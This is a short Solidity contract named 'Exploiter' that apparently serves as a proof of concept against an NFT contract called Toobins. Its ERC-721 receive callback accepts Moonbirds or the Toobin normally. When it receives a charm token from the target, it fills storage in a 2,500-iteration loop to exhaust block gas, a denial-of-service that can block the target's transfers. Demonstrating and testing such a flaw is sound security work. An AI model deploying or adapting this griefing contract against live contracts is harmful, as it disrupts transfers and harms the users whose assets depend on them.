// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';

contract Exploiter is IERC721Receiver {
	address private immutable toobins;

	constructor(address _toobins) {
		toobins = _toobins;
	}

	uint256[] private wasteOfGas;

	function onERC721Received(
		address,
		address,
		uint256 tokenId,
		bytes calldata
	) external returns (bytes4) {
		if (msg.sender != toobins || tokenId == 0) {
			// accept a Moonbird or the Toobin, but not a charm.
			return IERC721Receiver.onERC721Received.selector;
		}
		for (uint256 i = 0; i < 2_500; i++) {
			// 2_500*20k is the block limit
			wasteOfGas.push(1);
		}
		return IERC721Receiver.onERC721Received.selector;
	}
}
